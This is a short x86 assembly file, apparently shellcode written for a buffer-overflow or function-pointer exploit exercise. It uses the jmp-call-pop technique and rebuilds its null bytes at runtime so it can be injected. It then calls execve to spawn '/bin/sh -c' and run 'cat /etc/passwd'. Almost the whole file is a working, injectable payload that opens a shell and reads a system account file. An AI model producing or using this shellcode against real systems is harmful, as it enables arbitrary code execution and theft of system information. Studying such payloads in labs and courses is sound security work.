bits 32
; nop instructions added for padding 

; aligned with function pointer location 
nop 
nop

; find current location
start: jmp short codeEnd
start2: pop esi

; Use XOR to clear the A register
xor eax, eax

; add back null bytes to data with mov command
mov [byte esi+flagStr-exeStr-2], al ; subtract 2 to point to X char instead of y
mov [byte esi+cmdStr-exeStr-1], al 
mov [byte esi+arrayAddr-exeStr-1], al
mov [byte esi+arrayAddr-exeStr+12], eax




; address of exeStr is already in esi
; use mov command to restore array
mov [byte esi+arrayAddr-exeStr], esi

;use lea to compute address of flagStr
lea edi, [byte esi+flagStr-exeStr]
mov [byte esi+arrayAddr-exeStr+4], edi

; use lea to compute address of cmdStr 
lea edi, [byte esi+cmdStr-exeStr]
mov [byte esi+arrayAddr-exeStr+8], edi

; making system call
mov al, 0x0b
mov ebx, esi ; get and use runtime address of exeStr
lea ecx, [byte esi+arrayAddr-exeStr] ; get and use runtime address of array address
xor edx, edx ; edx is set to 0
int 0x80
codeEnd: call start2

; stores all data
exeStr: db "/bin/shXy" ; y is added to avoid problems with exploit in machine code
flagStr: db "-cX"
cmdStr: db "cat /etc/passwd;exitX"

arrayAddr:
dd 0xffffffff
dd 0xffffffff
dd 0xffffffff
dd 0xffffffff
newAddr: dd newAddr-start